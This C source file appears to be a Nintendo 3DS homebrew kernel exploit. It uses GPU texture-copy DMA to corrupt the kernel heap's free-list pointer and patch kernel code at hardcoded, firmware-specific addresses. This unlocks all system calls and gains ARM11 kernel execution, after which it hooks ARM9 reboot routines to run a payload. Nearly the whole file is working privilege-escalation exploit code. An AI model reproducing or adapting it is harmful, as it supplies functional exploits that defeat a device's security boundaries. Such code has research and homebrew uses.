#include <3ds.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <inttypes.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>

static u32 nopSlide[0x1000] __attribute__((aligned(0x1000)));
static const size_t bufSize = 0x10000;
static int32_t *buf;
static int32_t *createThreadPatchPtr;
static int32_t *svcPatchPtr;
static int svcIsPatched = 0;

// Uncomment to have progress printed w/ printf
#define DEBUG_PROCESS

static int gshaxCopy(void *dst, void *src, unsigned int len)
{
	void *p;
	int i;

	if (dst == NULL || src == NULL)
		return -1;

	p = linearMemAlign(0x10000, 0x40);
	if (p == NULL)
		return -1;

	// Sometimes I don't know the actual value to check (when copying from unknown memory)
	// so instead of using check_mem/check_off, just loop "enough" times.
	for (i = 0; i < 5; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, p, 16);
		GX_SetTextureCopy(NULL, src, 0, p, 0, 0x40, 8);
	}

	linearFree(p);

	return 0;
}

static int getPatchPtr()
{
	int32_t ver;
	u8 isN3DS;

	// Get proper patch address for our kernel -- thanks yifanlu once again
	ver = *(int32_t *)0x1FF80000; // KERNEL_VERSION register
	createThreadPatchPtr = NULL;
	svcPatchPtr = NULL;

	if (ver >= 0x022C0600) {
		APT_CheckNew3DS(NULL, &isN3DS);
		if (isN3DS) {
			switch(ver) {
				case 0x022C0600: // 2.44-6 8.0.0
				case 0x022E0000: // 2.26-0 9.0.0
					createThreadPatchPtr = (void *)0xDFF8382F;
					svcPatchPtr = (void *)0xDFF82260;
					return 0;

				default:
#ifdef DEBUG_PROCESS
					printf("Unrecognized kernel version %" PRIx32 ", returning...\n",
						ver);
#endif
					return 1;
			}
		}
	}

	switch (ver) {
		case 0x02220000: // 2.34-0 4.1.0
			createThreadPatchPtr = (void *)0xEFF83C97;
			svcPatchPtr = (void *)0xEFF827CC;
			return 0;

		case 0x02230600: // 2.35-6 5.0.0
			createThreadPatchPtr = (void *)0xEFF8372F;
			svcPatchPtr = (void *)0xEFF822A8;
			return 0;

		case 0x02240000: // 2.36-0 5.1.0
		case 0x02250000: // 2.37-0 6.0.0
		case 0x02260000: // 2.38-0 6.1.0
			createThreadPatchPtr = (void *)0xEFF8372B;
			svcPatchPtr = (void *)0xEFF822A4;
			return 0;

		case 0x02270400: // 2.39-4 7.0.0
			createThreadPatchPtr = (void *)0xEFF8372F;
			svcPatchPtr = (void *)0xEFF822A8;
			return 0;

		case 0x02280000: // 2.40-0 7.2.0
			createThreadPatchPtr = (void *)0xEFF8372B;
			svcPatchPtr = (void *)0xEFF822A4;
			return 0;

		case 0x022C0600: // 2.44-6 8.0.0
			createThreadPatchPtr = (void *)0xDFF83767;
			svcPatchPtr = (void *)0xDFF82294;
			return 0;

		case 0x022E0000: // 2.26-0 9.0.0
			createThreadPatchPtr = (void *)0xDFF83837;
			svcPatchPtr = (void *)0xDFF82290;
			return 0;

		default:
#ifdef DEBUG_PROCESS
			printf("Unrecognized kernel version %" PRIx32 ", returning...\n",
				ver);
#endif
			return 1;
		}
}

static inline void CleanAllDcache()
{
	__asm__("mov r0, #0\n"
		"mcr p15, 0, r0, c7, c10, 0\n"
		::: "r0");
}

static inline void InvalidateAllIcache()
{
	__asm__("mov r0, #0\n"
		"mcr p15, 0, r0, c7, c5, 0\n"
		::: "r0");
}

static int arm11_kernel_exploit_setup()
{
	const size_t allocSize = 0x2000;
	const size_t freeOffset = 0x1000;
	const size_t freeSize = allocSize - freeOffset;
	void *p;
	void *free;
	int32_t saved[8];
	u32 i;

	getPatchPtr();
#ifdef DEBUG_PROCESS
	printf("createThread Addr: %p\nSVC Addr: %p\n",
		createThreadPatchPtr, svcPatchPtr);
#endif

	// Part 1: corrupt kernel memory
	svcControlMemory((u32 *)&p, 0, 0, allocSize, MEMOP_ALLOC_LINEAR, 0x3);
	free = (void *)((uintptr_t)p + freeOffset);

	printf("Freeing memory\n");
	svcControlMemory(&i, (u32)free, 0, freeSize, MEMOP_FREE, 0);

	printf("Backing up heap area\n");
	gshaxCopy(buf, free, 0x20);

	memcpy(saved, buf, sizeof(saved));

	buf[0] = 1;
	buf[1] = (uint32_t)createThreadPatchPtr;
	buf[2] = 0;
	buf[3] = 0;

#ifdef DEBUG_PROCESS
	printf("Overwriting free pointer %p\n", p);
#endif

	// Trigger write to kernel
	gshaxCopy(free, buf, 0x10);
	svcControlMemory(&i, (u32)p, 0, freeOffset, MEMOP_FREE, 0);

#ifdef DEBUG_PROCESS
	printf("Triggered kernel write\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	memcpy(buf, saved, sizeof(saved));
	printf("Restoring heap\n");
	gshaxCopy(p, buf, 0x20);

	 // Part 2: trick to clear icache
	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
		buf[i] = 0xE1A00000; // ARM NOP instruction
	buf[i - 1] = 0xE12FFF1E; // ARM BX LR instruction

	gshaxCopy(nopSlide, buf, bufSize);

	HB_FlushInvalidateCache();
	((void (*)())nopSlide)();

#ifdef DEBUG_PROCESS
	printf("Exited nop slide\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	getPatchPtr();

	return 0;
}

void doArm9Hax()
{
	int (* const reboot)(int, int, int, int) = (void *)0xFFF748C4;

#ifdef DEBUG_PROCESS
	printf("Setting up Arm9\n");
#endif
	__asm__ ("clrex");

	CleanAllDcache();
	InvalidateAllIcache();

	// ARM9 code copied to FCRAM 0x23F00000
	//memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
	// Write function hook at 0xFFFF0C80
	//memcpy(0xEFFF4C80, 0x9D23AC, 0x9D2580);

	// Write FW specific offsets to copied code buffer
	*(int32_t *)(0xEFFF4C80 + 0x60) = 0xFFFD0000; // PDN regs
	*(int32_t *)(0xEFFF4C80 + 0x64) = 0xFFFD2000; // PXI regs
	*(int32_t *)(0xEFFF4C80 + 0x68) = 0xFFF84DDC; // where to return to from hook

	// Patch function 0xFFF84D90 to jump to our hook
	*(int32_t *)(0xFFF84DD4 + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
	*(int32_t *)(0xFFF84DD4 + 4) = 0xFFFF0C80; // jump_table + 0
	// Patch reboot start function to jump to our hook
	*(int32_t *)(0xFFFF097C + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
	*(int32_t *)(0xFFFF097C + 4) = 0x1FFF4C84; // jump_table + 4

	InvalidateAllIcache();

	reboot(0, 0, 2, 0);
}

static void test()
{
	buf[0] = 0xFEEFF00F;
}

static void _Noreturn __attribute__((naked)) arm11_kernel_exec()
{
	const int32_t nop = 0xE320F000;

	__asm__("add sp, sp, #8\n");

	buf[0] = 0xF00FF00F;

	// Fix up memory
	*(int32_t *)(createThreadPatchPtr+8) = 0x8DD00CE5;

	// Give us access to all SVCs (including 0x7B, so we can go to kernel mode)
	if (svcPatchPtr > 0) {
		*(int32_t *)(svcPatchPtr) = nop;
		*(int32_t *)(svcPatchPtr + 8) = nop;
		svcIsPatched = 1;
	}
	InvalidateAllIcache();
	CleanAllDcache();

	__asm__("movs r0, #0\n"
		 "pop {pc}\n");
}

int doARM11Hax()
{
	u32 result;
	int i;

	HB_ReprotectMemory(nopSlide, 4, 7, &result);

	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
		nopSlide[i] = 0xE1A00000; // ARM NOP instruction
	nopSlide[i-1] = 0xE12FFF1E; // ARM BX LR instruction
	HB_FlushInvalidateCache();

#ifdef DEBUG_PROCESS
	printf("Testing nop slide\n");
#endif

	((void (*)())nopSlide)();

#ifdef DEBUG_PROCESS
	printf("Exited nop slide\n");
#endif

	buf = linearMemAlign(bufSize, 0x10000);

	// Wipe memory for debugging purposes
	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
		buf[i] = 0xDEADBEEF;

	i = arm11_kernel_exploit_setup();
	if (i)
		return i;

#ifdef DEBUG_PROCESS
	printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
#endif
	__asm__("ldr r0, =%0\n"
		"svc #8\n"
		:: "i"(arm11_kernel_exec) : "r0");
	//if (svcIsPatched)
	{
#ifdef DEBUG_PROCESS
		printf("Testing SVC 0x7B\n");
#endif
		__asm__("ldr r0, =%0\n"
			"svc #0x7B\n"
			:: "i"(test) : "r0");

		doArm9Hax();

#ifdef DEBUG_PROCESS
		printf("Arm9 setup\n");
#endif
	}

	return !svcIsPatched;
}
